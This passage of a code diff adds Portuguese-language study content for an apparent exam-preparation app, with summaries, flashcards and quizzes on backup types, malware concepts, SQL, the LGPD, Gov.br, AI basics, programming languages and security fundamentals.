+            options: ['Relatorio_15-03-2026.pdf', '2026-03-15_Relatorio_Mensal.pdf', 'Relatorio_Marco_2026.pdf', '15_03_2026_Relatorio.pdf'],
+            answer: 1,
+            explanation: 'O padrão ISO 8601 (AAAA-MM-DD) garante ordenação alfabética e cronológica simultânea.'
+          }
+        ]
+      },
+      {
+        id: 'ti-5',
+        track: 'TI',
+        number: '5',
+        title: 'Segurança da Informação Básica, Pragas Virtuais e Backup',
+        shortDesc: 'Procedimentos, vírus/worms/malwares, antivírus/firewall, tipos de backup e cloud storage.',
+        tags: ['Malware', 'Vírus', 'Worm', 'Backup', 'Incremental', 'Diferencial', 'Cloud Storage'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A proteção cotidiana de estações de trabalho e dados corporativos depende da combinação de boas práticas humanas, ferramentas de defesa de endpoint e rotinas rigorosas de cópia de segurança.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-5">
+            <div class="p-4 rounded-xl bg-slate-900 border border-rose-500/30">
+              <h4 class="text-rose-400 font-semibold mb-2">5.2 Vírus, Worms e Pragas Virtuais</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Vírus:</strong> Precisa de um <em>arquivo hospedeiro</em> e da ação do usuário para ser executado e se propagar.</li>
+                <li><strong>Worm (Verme):</strong> Autônomo! Propaga-se automaticamente pela rede explorando vulnerabilidades, sem precisar de hospedeiro.</li>
+                <li><strong>Trojan (Cavalo de Troia):</strong> Disfarça-se de software legítimo para abrir portas (backdoors). Não se autorreplica.</li>
+                <li><strong>Spyware / Keylogger:</strong> Monitora atividades e captura teclas digitadas silenciosamente.</li>
+                <li><strong>Ransomware:</strong> Sequestra dados via criptografia forte e exige resgate.</li>
+              </ul>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-cyan-500/30">
+              <h4 class="text-cyan-400 font-semibold mb-2">5.1, 5.3 & 5.5 Defesa e Cloud Storage</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Antivírus / EDR:</strong> Detecta malwares por assinaturas, análise heurística e comportamento.</li>
+                <li><strong>Firewall Pessoal:</strong> Filtra pacotes de entrada e saída com base em portas, IPs e aplicações.</li>
+                <li><strong>Procedimentos Seguros:</strong> Atualizações (patches), bloqueio de tela (<code class="text-cyan-300">Win+L</code>), não usar conta Administrador no dia a dia.</li>
+                <li><strong>Cloud Storage:</strong> OneDrive, Google Drive, S3 — oferecem sincronização, versionamento (vital contra ransomware) e redundância geográfica.</li>
+              </ul>
+            </div>
+          </div>
+
+          <h4 class="text-emerald-400 font-semibold mb-2 text-sm">5.4 Procedimentos de Backup & Regra 3-2-1</h4>
+          <div class="overflow-x-auto rounded-xl border border-slate-800">
+            <table class="w-full text-left text-xs sm:text-sm">
+              <thead class="bg-slate-900 text-slate-300 border-b border-slate-800">
+                <tr>
+                  <th class="p-3">Tipo de Backup</th>
+                  <th class="p-3">O que copia?</th>
+                  <th class="p-3">Velocidade de Backup</th>
+                  <th class="p-3">Velocidade de Restauração</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-slate-800 text-slate-300">
+                <tr>
+                  <td class="p-3 font-semibold text-cyan-300">Completo (Full)</td>
+                  <td class="p-3">Todos os dados selecionados (desmarca bit de arquivamento).</td>
+                  <td class="p-3 text-rose-400">Lenta</td>
+                  <td class="p-3 text-emerald-400">Muito Rápida (1 mídia)</td>
+                </tr>
+                <tr>
+                  <td class="p-3 font-semibold text-emerald-300">Incremental</td>
+                  <td class="p-3">Apenas dados alterados desde o <strong>último backup (qualquer tipo)</strong>.</td>
+                  <td class="p-3 text-emerald-400">Muito Rápida</td>
+                  <td class="p-3 text-rose-400">Lenta (Full + todos incrementais)</td>
+                </tr>
+                <tr>
+                  <td class="p-3 font-semibold text-amber-300">Diferencial</td>
+                  <td class="p-3">Todos os dados alterados desde o <strong>último backup Completo</strong>.</td>
+                  <td class="p-3 text-amber-400">Moderada (cresce a cada dia)</td>
+                  <td class="p-3 text-cyan-400">Rápida (Full + último diferencial)</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p class="text-xs text-slate-400 mt-2">💡 <strong>Regra 3-2-1:</strong> Manter <strong>3</strong> cópias dos dados, em <strong>2</strong> mídias diferentes, com <strong>1</strong> cópia fora do local físico (off-site / nuvem).</p>
+        `,
+        labType: 'backup-simulator',
+        flashcards: [
+          { q: 'Qual a diferença fundamental entre um Vírus e um Worm?', a: 'O vírus precisa de um arquivo hospedeiro e intervenção humana para ser executado. O worm é autônomo e se propaga automaticamente pela rede explorando falhas.' },
+          { q: 'Em caso de desastre na quinta-feira (com Backup Full no domingo e Diferencial diário), quais mídias são necessárias para restaurar tudo?', a: 'Apenas duas mídias: o Backup Completo de domingo e o último Backup Diferencial de quarta-feira.' }
+        ],
+        quiz: [
+          {
+            question: 'Uma empresa realiza backup Completo aos domingos e backup Incremental de segunda a sexta. Se o servidor falhar na quinta-feira pela manhã, quais backups serão necessários para a restauração completa?',
+            options: ['Apenas o incremental de quarta-feira', 'O completo de domingo + o incremental de quarta-feira', 'O completo de domingo + os incrementais de segunda, terça e quarta-feira', 'Apenas o completo de domingo'],
+            answer: 2,
+            explanation: 'No backup incremental, cada dia grava apenas a diferença em relação ao dia anterior. Assim, para restaurar até quarta, são necessários o Full de domingo e todos os incrementais subsequentes (seg, ter e qua).'
+          }
+        ]
+      },
+      {
+        id: 'ti-6',
+        track: 'TI',
+        number: '6',
+        title: 'Banco de Dados e Linguagem SQL',
+        shortDesc: 'Modelagem (DER), SGBDs, DDL/DML, SQL na prática, propriedades ACID, BD Distribuídos e OO.',
+        tags: ['SQL', 'SGBD', 'DDL', 'DML', 'ACID', 'Modelagem', 'NoSQL'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            Bancos de dados estruturam o armazenamento persistente e seguro das informações corporativas por meio de <strong>Sistemas Gerenciadores de Banco de Dados (SGBDs)</strong> como PostgreSQL, Oracle, SQL Server e MySQL.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+              <h4 class="text-cyan-400 font-semibold mb-2">6.1 a 6.3 Abstração, Modelos e Acesso</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Níveis de Abstração:</strong> Externo (visões/views), Conceitual (entidades/relacionamentos - DER) e Interno/Físico (índices B-Tree, Hash, arquivos em disco).</li>
+                <li><strong>Chaves:</strong> <em>Chave Primária (PK)</em> identifica unicamente um registro; <em>Chave Estrangeira (FK)</em> garante integridade referencial entre tabelas.</li>
+                <li><strong>6.7 BD Distribuídos & OO:</strong> Replicação/fragmentação em múltiplos nós (Teorema CAP) e Bancos Orientados a Objetos (persistem objetos complexos diretamente).</li>
+              </ul>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+              <h4 class="text-emerald-400 font-semibold mb-2">6.4 & 6.5 Sublinguagens SQL</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>DDL (Definição):</strong> <code class="text-cyan-300">CREATE</code>, <code class="text-cyan-300">ALTER</code>, <code class="text-cyan-300">DROP</code>, <code class="text-cyan-300">TRUNCATE</code> (estrutura das tabelas).</li>
+                <li><strong>DML (Manipulação):</strong> <code class="text-emerald-300">SELECT</code>, <code class="text-emerald-300">INSERT</code>, <code class="text-emerald-300">UPDATE</code>, <code class="text-emerald-300">DELETE</code> (dados).</li>
+                <li><strong>DCL (Controle):</strong> <code class="text-amber-300">GRANT</code>, <code class="text-amber-300">REVOKE</code> (permissões).</li>
+                <li><strong>TCL (Transação):</strong> <code class="text-indigo-300">COMMIT</code>, <code class="text-indigo-300">ROLLBACK</code>, <code class="text-indigo-300">SAVEPOINT</code>.</li>
+              </ul>
+            </div>
+          </div>
+          <div class="p-4 rounded-xl bg-slate-900 border border-indigo-500/30">
+            <h4 class="text-indigo-400 font-semibold mb-2 text-sm">6.6 Controle de Integridade e Transações — Propriedades ACID</h4>
+            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs">
+              <div class="p-2.5 rounded-lg bg-slate-950 border border-slate-800"><strong class="text-cyan-400">A - Atomicidade:</strong> Tudo ou nada na transação.</div>
+              <div class="p-2.5 rounded-lg bg-slate-950 border border-slate-800"><strong class="text-emerald-400">C - Consistência:</strong> Respeita regras, PKs, FKs e constraints.</div>
+              <div class="p-2.5 rounded-lg bg-slate-950 border border-slate-800"><strong class="text-amber-400">I - Isolamento:</strong> Transações concorrentes não interferem entre si.</div>
+              <div class="p-2.5 rounded-lg bg-slate-950 border border-slate-800"><strong class="text-indigo-400">D - Durabilidade:</strong> Após COMMIT, dados persistem mesmo com queda de energia.</div>
+            </div>
+          </div>
+        `,
+        labType: 'sql-sandbox',
+        flashcards: [
+          { q: 'Qual a diferença entre DELETE e TRUNCATE em SQL?', a: 'DELETE é DML, remove linhas podendo usar cláusula WHERE, gera log linha a linha e pode sofrer ROLLBACK. TRUNCATE é DDL, apaga todas as linhas da tabela rapidamente sem WHERE.' },
+          { q: 'O que significa a letra I na sigla ACID em Bancos de Dados?', a: 'Isolamento: garante que a execução concorrente de múltiplas transações produza o mesmo resultado que se fossem executadas sequencialmente.' }
+        ],
+        quiz: [
+          {
+            question: 'Qual comando SQL pertence à sublinguagem DDL (Data Definition Language)?',
+            options: ['UPDATE', 'SELECT', 'ALTER TABLE', 'GRANT'],
+            answer: 2,
+            explanation: 'ALTER TABLE modifica a estrutura de uma tabela existente, fazendo parte da DDL (CREATE, ALTER, DROP, TRUNCATE).'
+          },
+          {
+            question: 'Em uma transferência bancária entre contas, se o débito ocorrer mas o crédito falhar, o sistema desfaz toda a operação. Qual propriedade ACID garante isso?',
+            options: ['Durabilidade', 'Atomicidade', 'Isolamento', 'Normalização'],
+            answer: 1,
+            explanation: 'A Atomicidade estabelece o princípio do "tudo ou nada": ou todas as operações da transação são concluídas com sucesso, ou nenhuma é aplicada.'
+          }
+        ]
+      },
+      {
+        id: 'ti-7',
+        track: 'TI',
+        number: '7',
+        title: 'Lei nº 13.709/2018 — Lei Geral de Proteção de Dados (LGPD)',
+        shortDesc: 'Princípios, dados sensíveis, bases legais, direitos do titular, DPO e sanções da ANPD.',
+        tags: ['LGPD', 'ANPD', 'DPO', 'Controlador', 'Operador', 'Dados Sensíveis', 'Privacidade'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A <strong>LGPD (Lei nº 13.709/2018)</strong> regula o tratamento de dados pessoais no Brasil (meios físicos e digitais), protegendo os direitos fundamentais de liberdade, privacidade e livre desenvolvimento da personalidade.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+              <h4 class="text-cyan-400 font-semibold mb-2">Conceitos e Categorias de Dados</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Dado Pessoal:</strong> Informação que identifica ou torna identificável uma pessoa natural (CPF, e-mail, IP, cookies).</li>
+                <li><strong>Dado Pessoal Sensível:</strong> Origem racial/étnica, convicção religiosa, opinião política, filiação sindical, dado referente à saúde, vida sexual, dado genético ou biométrico.</li>
+                <li><strong>Dado Anonimizado:</strong> Perde a possibilidade de associação direta ou indireta a um indivíduo (não é considerado dado pessoal pela LGPD, salvo reversão).</li>
+              </ul>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+              <h4 class="text-indigo-400 font-semibold mb-2">Agentes de Tratamento e Governança</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Controlador:</strong> Pessoa natural ou jurídica a quem competem as <em>decisões</em> referentes ao tratamento de dados.</li>
+                <li><strong>Operador:</strong> Realiza o tratamento de dados pessoais <em>em nome do controlador</em>.</li>
+                <li><strong>Encarregado (DPO):</strong> Canal de comunicação entre o controlador, os titulares dos dados e a <strong>ANPD</strong> (Autoridade Nacional de Proteção de Dados).</li>
+              </ul>
+            </div>
+          </div>
+          <div class="p-4 rounded-xl bg-slate-900/90 border border-amber-500/30 text-xs sm:text-sm text-slate-300">
+            <strong class="text-amber-400 block mb-1">10 Bases Legais (Art. 7º) & Sanções (Art. 52):</strong>
+            O tratamento só é lícito se enquadrado em uma base legal, como: <em>Consentimento, Cumprimento de obrigação legal/regulatória, Execução de políticas públicas, Execução de contrato, Exercício regular de direitos, Proteção da vida, Tutela da saúde, Legítimo interesse</em> e <em>Proteção ao crédito</em>. Sanções incluem advertência, multa simples de até <strong>2% do faturamento</strong> (limitada a R$ 50 milhões por infração), bloqueio e eliminação dos dados.
+          </div>
+        `,
+        labType: 'lgpd-classifier',
+        flashcards: [
+          { q: 'Quem é o Encarregado (DPO) segundo a LGPD?', a: 'É a pessoa indicada pelo controlador e operador para atuar como canal de comunicação entre o controlador, os titulares dos dados e a Autoridade Nacional de Proteção de Dados (ANPD).' },
+          { q: 'O consentimento é a única base legal para tratar dados pessoais na LGPD?', a: 'Não! Existem 10 bases legais no Art. 7º, incluindo cumprimento de obrigação legal, execução de contrato, proteção da vida e legítimo interesse.' }
+        ],
+        quiz: [
+          {
+            question: 'Segundo a LGPD, qual dos seguintes dados é classificado especificamente como "Dado Pessoal Sensível"?',
+            options: ['Número do CPF e endereço residencial', 'Dado biométrico e convicção religiosa', 'Placa do veículo e profissão', 'Endereço IP dinâmico'],
+            answer: 1,
+            explanation: 'O Art. 5º, II define dado sensível como aquele sobre origem racial/étnica, convicção religiosa, opinião política, saúde, vida sexual, dado genético ou biométrico.'
+          }
+        ]
+      },
+      {
+        id: 'ti-8',
+        track: 'TI',
+        number: '8',
+        title: 'Serviços Públicos Digitais (Gov.br)',
+        shortDesc: 'Governo Digital, níveis de conta (Bronze, Prata, Ouro), assinatura eletrônica e interoperabilidade.',
+        tags: ['Gov.br', 'Governo Digital', 'Lei 14.129', 'Assinatura Eletrônica', 'Interoperabilidade'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A transformação digital do Estado brasileiro (regida pela <strong>Lei nº 14.129/2021 — Lei do Governo Digital</strong>) centraliza o acesso do cidadão aos serviços públicos por meio da plataforma <strong>Gov.br</strong>, reduzindo burocracia e papel.
+          </p>
+          <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-amber-700/40">
+              <span class="text-xs font-bold uppercase tracking-wider text-amber-500">Nível Bronze</span>
+              <h4 class="font-semibold text-white mt-1 mb-1">Cadastro Básico</h4>
+              <p class="text-xs text-slate-400">Validação via formulário web (CPF/Receita Federal ou INSS). Acesso limitado a serviços digitais básicos.</p>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-400/40">
+              <span class="text-xs font-bold uppercase tracking-wider text-slate-300">Nível Prata</span>
+              <h4 class="font-semibold text-white mt-1 mb-1">Validação Intermediária</h4>
+              <p class="text-xs text-slate-400">Biometria facial via CNH, bancos credenciados (Internet Banking) ou validação como servidor público (SIGEPE).</p>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-yellow-400/40">
+              <span class="text-xs font-bold uppercase tracking-wider text-yellow-400">Nível Ouro</span>
+              <h4 class="font-semibold text-white mt-1 mb-1">Segurança Máxima</h4>
+              <p class="text-xs text-slate-400">Biometria facial da Justiça Eleitoral (TSE), Certificado Digital ICP-Brasil ou Carteira de Identidade Nacional (CIN).</p>
+            </div>
+          </div>
+          <div class="p-4 rounded-xl bg-slate-900 border border-slate-800 text-xs sm:text-sm text-slate-300 space-y-2">
+            <p><strong class="text-cyan-400">Assinatura Eletrônica Gov.br (Lei 14.063/2020):</strong> Contas Prata e Ouro permitem assinar documentos digitais gratuitamente com validade jurídica (assinatura eletrônica avançada).</p>
+            <p><strong class="text-emerald-400">Interoperabilidade (Conecta Gov.br):</strong> Princípio pelo qual os órgãos públicos compartilham dados entre si (ex: Receita, INSS, Detran) para evitar exigir do cidadão documentos que o próprio Estado já possui.</p>
+          </div>
+        `,
+        labType: 'gov-simulator',
+        flashcards: [
+          { q: 'Quais níveis de conta Gov.br permitem realizar a Assinatura Eletrônica gratuita no portal?', a: 'Apenas as contas de nível Prata e Ouro possuem confiabilidade suficiente para gerar assinaturas eletrônicas avançadas no Gov.br.' },
+          { q: 'O que significa o princípio da Interoperabilidade no Governo Digital?', a: 'É a capacidade de diferentes sistemas e órgãos públicos trocarem informações de forma integrada e segura, dispensando o cidadão de apresentar documentos já existentes nas bases governamentais.' }
+        ],
+        quiz: [
+          {
+            question: 'Qual mecanismo garante ao cidadão alcançar o nível OURO de confiabilidade na conta Gov.br?',
+            options: ['Apenas o preenchimento do CPF e data de nascimento', 'Validação facial com a base da Justiça Eleitoral (TSE) ou Certificado Digital ICP-Brasil', 'Confirmação por e-mail e SMS', 'Login via redes sociais'],
+            answer: 1,
+            explanation: 'O nível Ouro exige validação biométrica na base do TSE, CIN ou uso de Certificado Digital compatível com ICP-Brasil.'
+          }
+        ]
+      },
+      {
+        id: 'ti-9',
+        track: 'TI',
+        number: '9',
+        title: 'Inteligência Artificial (IA, Machine Learning e LLMs)',
+        shortDesc: 'IA Simbólica vs Conexionista, Machine Learning, Deep Learning, IA Generativa e ética.',
+        tags: ['IA', 'Machine Learning', 'Deep Learning', 'LLM', 'Redes Neurais', 'Prompts'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A <strong>Inteligência Artificial (IA)</strong> engloba sistemas computacionais capazes de realizar tarefas que normalmente exigiriam inteligência humana, como reconhecimento de padrões, tomada de decisão, visão computacional e processamento de linguagem natural.
+          </p>
+          <div class="p-4 rounded-xl bg-slate-900 border border-indigo-500/30 mb-4">
+            <h4 class="text-indigo-400 font-semibold mb-3 text-sm">Hierarquia Conceitual da IA</h4>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
+              <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
+                <strong class="text-cyan-400 block mb-1">1. Machine Learning (Aprendizado de Máquina)</strong>
+                <p class="text-slate-400">Algoritmos aprendem padrões a partir de dados sem serem explicitamente programados para cada regra. Tipos: <em>Supervisionado</em> (dados rotulados), <em>Não Supervisionado</em> (clustering) e <em>Por Reforço</em>.</p>
+              </div>
+              <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
+                <strong class="text-indigo-400 block mb-1">2. Deep Learning (Aprendizado Profundo)</strong>
+                <p class="text-slate-400">Subcampo do ML baseado em <strong>Redes Neurais Artificiais Profundas</strong> com múltiplas camadas ocultas, ideal para imagens, áudio e texto complexo.</p>
+              </div>
+              <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
+                <strong class="text-emerald-400 block mb-1">3. IA Generativa & LLMs</strong>
+                <p class="text-slate-400">Modelos baseados na arquitetura <strong>Transformer</strong> (ex: Gemini, GPT) treinados em bilhões de tokens para gerar texto, código, imagens e áudio novos.</p>
+              </div>
+            </div>
+          </div>
+          <div class="p-4 rounded-xl bg-slate-900 border border-slate-800 text-xs sm:text-sm text-slate-300">
+            <strong class="text-amber-400">Riscos e Governança em IA:</strong> <em>Alucinações</em> (geração de respostas plausíveis, porém factualmente incorretas), <em>Viés Algorítmico</em> (preconceitos herdados dos dados de treino), vazamento de dados sensíveis em prompts públicos e necessidade de supervisão humana (Human-in-the-loop).
+          </div>
+        `,
+        labType: 'ai-classifier',
+        flashcards: [
+          { q: 'Qual a diferença entre Aprendizado Supervisionado e Não Supervisionado?', a: 'No Supervisionado o modelo treina com dados já rotulados (ex: e-mails marcados como spam/não-spam). No Não Supervisionado o algoritmo encontra agrupamentos ocultos sem rótulos prévios.' },
+          { q: 'O que é "alucinação" em Grandes Modelos de Linguagem (LLMs)?', a: 'É o fenômeno em que o modelo gera informações incorretas, inventadas ou sem respaldo nos fatos, apresentando-as com tom confiante.' }
+        ],
+        quiz: [
+          {
+            question: 'Um algoritmo bancário é treinado com um histórico de milhões de transações já classificadas como "Legítima" ou "Fraude" para prever novas ocorrências. Esse paradigma é:',
+            options: ['Aprendizado Não Supervisionado', 'Aprendizado Supervisionado', 'Computação Quântica', 'Sistemas Especialistas Baseados em Regras Fixas'],
+            answer: 1,
+            explanation: 'Como os dados históricos possuem rótulos conhecidos (Legítima/Fraude), trata-se de Aprendizado Supervisionado (classificação).'
+          }
+        ]
+      },
+      {
+        id: 'ti-10',
+        track: 'TI',
+        number: '10',
+        title: 'Linguagens de Programação (Java, Python, Apex e C#)',
+        shortDesc: 'Paradigmas, tipagem, execução (JVM/CLR/Interpretador) e comparação prática de sintaxe.',
+        tags: ['Java', 'Python', 'Apex', 'C#', 'POO', 'Tipagem'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            Compreender as características, ecossistemas e diferenças sintáticas entre <strong>Java, Python, Apex e C#</strong> permite escolher a ferramenta adequada para cada arquitetura de software.
+          </p>
+          <div class="overflow-x-auto rounded-xl border border-slate-800 mb-4">
+            <table class="w-full text-left text-xs sm:text-sm">
+              <thead class="bg-slate-900 text-slate-300 border-b border-slate-800">
+                <tr>
+                  <th class="p-3">Linguagem</th>
+                  <th class="p-3">Tipagem & Paradigma</th>
+                  <th class="p-3">Ambiente de Execução</th>
+                  <th class="p-3">Principais Aplicações</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-slate-800 text-slate-300">
+                <tr>
+                  <td class="p-3 font-bold text-amber-400">Java</td>
+                  <td class="p-3">Estática, Forte / Orientada a Objetos</td>
+                  <td class="p-3">Compilada para Bytecode → <strong>JVM</strong> (Write Once, Run Anywhere)</td>
+                  <td class="p-3">Sistemas corporativos, bancos, microsserviços (Spring Boot), Android.</td>
+                </tr>
+                <tr>
+                  <td class="p-3 font-bold text-cyan-400">Python</td>
+                  <td class="p-3">Dinâmica, Forte / Multiparadigma (POO, Funcional)</td>
+                  <td class="p-3">Interpretada (CPython), indentação obrigatória</td>
+                  <td class="p-3">Ciência de Dados, IA/ML, automação, scripts de cibersegurança, web (Django/FastAPI).</td>
+                </tr>
+                <tr>
+                  <td class="p-3 font-bold text-indigo-400">Apex</td>
+                  <td class="p-3">Estática, Forte / Orientada a Objetos (sintaxe estilo Java)</td>
+                  <td class="p-3">Executada diretamente nos servidores nuvem da <strong>Salesforce</strong> (Multitenant)</td>
+                  <td class="p-3">Triggers, lógica de negócios, integrações e APIs na plataforma Salesforce CRM.</td>
+                </tr>
+                <tr>
+                  <td class="p-3 font-bold text-emerald-400">C# (C-Sharp)</td>
+                  <td class="p-3">Estática, Forte / Multiparadigma (POO, LINQ)</td>
+                  <td class="p-3">Compilada para IL → <strong>.NET CLR</strong></td>
+                  <td class="p-3">Aplicações corporativas .NET, APIs web, desktop Windows, jogos (Unity).</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        `,
+        labType: 'code-comparator',
+        flashcards: [
+          { q: 'O que é a linguagem Apex e onde ela é executada?', a: 'Apex é uma linguagem fortemente tipada e orientada a objetos, com sintaxe semelhante ao Java, desenvolvida pela Salesforce e executada exclusivamente nos servidores multitenant da nuvem Salesforce.' },
+          { q: 'Qual a semelhança arquitetural entre Java e C#?', a: 'Ambas são fortemente tipadas, orientadas a objetos e compilam o código-fonte para uma linguagem intermediária (Bytecode no Java / CIL no C#) executada por uma máquina virtual (JVM / CLR).' }
+        ],
+        quiz: [
+          {
+            question: 'Qual das linguagens abaixo possui tipagem dinâmica, utiliza indentação obrigatória para delimitar blocos de código e é amplamente usada em IA e automação?',
+            options: ['Java', 'Apex', 'Python', 'C#'],
+            answer: 2,
+            explanation: 'Python utiliza indentação para estruturar blocos (sem chaves {}), possui tipagem dinâmica e forte, e lidera o ecossistema de IA/Dados.'
+          }
+        ]
+      },
+
+      // -------------------- TRILHA II: SEGURANÇA CIBERNÉTICA --------------------
+      {
+        id: 'sec-1',
+        track: 'SEC',
+        number: '1',
+        title: 'Fundamentos de Segurança da Informação (Tríade CID)',
+        shortDesc: 'Confidencialidade, Integridade, Disponibilidade + Autenticidade e Não-Repúdio.',
+        tags: ['CID', 'CIA Triad', 'Confidencialidade', 'Integridade', 'Disponibilidade', 'Não-Repúdio'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A Segurança da Informação visa proteger os ativos informacionais contra ameaças que comprometam seu valor para o negócio. Seu alicerce é a <strong>Tríade CID</strong> (em inglês, <em>CIA Triad</em>), complementada por pilares adicionais.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-cyan-500/40">
+              <div class="text-cyan-400 font-bold text-base mb-1">1.1 Confidencialidade</div>
+              <p class="text-xs sm:text-sm text-slate-300 mb-2">Garante que a informação seja acessada <strong>apenas por pessoas ou sistemas autorizados</strong>.</p>
+              <span class="text-[11px] font-mono text-cyan-300 bg-cyan-950/60 px-2 py-1 rounded">Controles: Criptografia, Controle de Acesso, MFA.</span>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-emerald-500/40">
+              <div class="text-emerald-400 font-bold text-base mb-1">1.2 Integridade</div>
+              <p class="text-xs sm:text-sm text-slate-300 mb-2">Garante a exatidão e completude da informação, impedindo <strong>alterações ou destruições não autorizadas</strong>.</p>
+              <span class="text-[11px] font-mono text-emerald-300 bg-emerald-950/60 px-2 py-1 rounded">Controles: Hashing (SHA-256), Assinatura Digital, Logs.</span>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-amber-500/40">
+              <div class="text-amber-400 font-bold text-base mb-1">1.3 Disponibilidade</div>
+              <p class="text-xs sm:text-sm text-slate-300 mb-2">Garante que os sistemas e dados estejam <strong>acessíveis e operacionais sempre que requisitados</strong> por usuários legítimos.</p>
+              <span class="text-[11px] font-mono text-amber-300 bg-amber-950/60 px-2 py-1 rounded">Controles: Redundância, Backup, Anti-DDoS, No-breaks.</span>
+            </div>
+          </div>
+          <div class="p-4 rounded-xl bg-slate-900 border border-slate-800 text-xs sm:text-sm text-slate-300 grid grid-cols-1 sm:grid-cols-2 gap-3">
+            <div><strong class="text-indigo-400">Autenticidade:</strong> Garante que a identidade declarada pelo emissor ou usuário é verdadeira.</div>
+            <div><strong class="text-rose-400">Não-Repúdio (Irretratabilidade):</strong> Impede que o autor de uma ação ou transação negue sua autoria posteriormente (garantido pela assinatura digital).</div>
+          </div>
+        `,
+        labType: 'cid-triage',
+        flashcards: [
+          { q: 'Qual pilar da Tríade CID é violado diretamente por um ataque DDoS (Negação de Serviço)?', a: 'Disponibilidade, pois o ataque torna o serviço inacessível para os usuários legítimos.' },
+          { q: 'O que garante o princípio do Não-Repúdio (Irretratabilidade)?', a: 'Garante que o emissor de uma mensagem ou transação não possa negar posteriormente que foi ele quem a realizou, geralmente obtido por meio de Assinatura Digital.' }
+        ],
+        quiz: [
+          {
+            question: 'Um atacante intercepta um arquivo financeiro em trânsito e altera o valor de pagamento antes que ele chegue ao destino, sem que ninguém perceba. Qual pilar principal foi violado?',
+            options: ['Disponibilidade', 'Integridade', 'Portabilidade', 'Escalabilidade'],
+            answer: 1,
+            explanation: 'A alteração indevida e não autorizada do conteúdo de uma informação viola diretamente o princípio da Integridade.'
+          }
+        ]
+      },
+      {
+        id: 'sec-2',
+        track: 'SEC',
+        number: '2',
+        title: 'Gestão de Riscos e Conformidade',
+        shortDesc: 'Avaliação de riscos (Ameaça x Vulnerabilidade x Impacto), Políticas de Segurança e ISO 27001/27002.',
+        tags: ['Riscos', 'ISO 27001', 'ISO 27002', 'PSI', 'Compliance', 'Vulnerabilidade'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A gestão de riscos equilibra o custo dos controles de segurança com o impacto potencial dos incidentes ao negócio, alinhando a organização às normas internacionais.
+          </p>
+          <div class="p-4 rounded-xl bg-slate-900 border border-cyan-500/30 mb-4">
+            <h4 class="text-cyan-400 font-semibold mb-2 text-sm">2.1 Equação Fundamental e Tratamento de Riscos</h4>
+            <p class="text-xs sm:text-sm text-slate-300 mb-3">
+              <strong>Risco = Probabilidade (Ameaça explorando Vulnerabilidade) × Impacto no Ativo.</strong><br/>
+              Após avaliar o risco, a organização escolhe uma das 4 respostas possíveis:
+            </p>
+            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs">
+              <div class="p-2.5 rounded bg-slate-950 border border-slate-800"><strong class="text-emerald-400">Mitigar:</strong> Aplicar controles (firewall, patch) para reduzir o risco.</div>
+              <div class="p-2.5 rounded bg-slate-950 border border-slate-800"><strong class="text-amber-400">Transferir:</strong> Compartilhar com terceiros (seguro cibernético, cloud).</div>
+              <div class="p-2.5 rounded bg-slate-950 border border-slate-800"><strong class="text-rose-400">Evitar:</strong> Descontinuar a atividade ou sistema arriscado.</div>
+              <div class="p-2.5 rounded bg-slate-950 border border-slate-800"><strong class="text-indigo-400">Aceitar:</strong> Assumir o risco residual quando o custo do controle supera o benefício.</div>
+            </div>
+          </div>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+              <h4 class="text-indigo-400 font-semibold mb-2">2.2 Políticas de Segurança (PSI)</h4>
+              <p class="text-xs sm:text-sm text-slate-300">Hierarquia documental: <strong>Política (PSI)</strong> (diretrizes de alto nível aprovadas pela diretoria) → <strong>Normas/Padrões</strong> (regras obrigatórias, ex: senha de 12 caracteres) → <strong>Procedimentos</strong> (passo a passo operacional).</p>
+            </div>
